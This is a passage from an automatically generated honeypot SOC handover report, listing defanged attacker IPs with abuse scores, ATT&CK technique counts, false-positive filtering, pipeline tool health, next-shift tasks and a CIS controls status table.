| `178.178.194[.]136` | RU | Metropolitan branch of PJSC MegaFon | **100** ⚠️ | 50 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |
| `220.132.170[.]64` | TW | Chunghwa Telecom Data Communication Business Group | **100** ⚠️ | 50 |
| `213.230.65[.]53` | UZ | Uzbektelekom Joint Stock Company | **100** ⚠️ | 50 |
| `66.132.172[.]187` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `111.21.105[.]250` | CN | China Mobile Communications Corporation | **100** ⚠️ | 48 |
| `52.142.44[.]95` | US | Microsoft Corporation | **100** ⚠️ | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 167 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 141 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 11 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 10 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 4 |

---

## 🔕 False Positive Summary (25 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 22 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 312 cases |
| Tool 34  | Credential Extractor        | ✅ 200 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 16 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 129 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 25 filtered (8.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 74 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 141 priority case(s) shown individually · 36 recon entry/entries in table (11 group(s) consolidating 121 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-09T10:59:13Z_
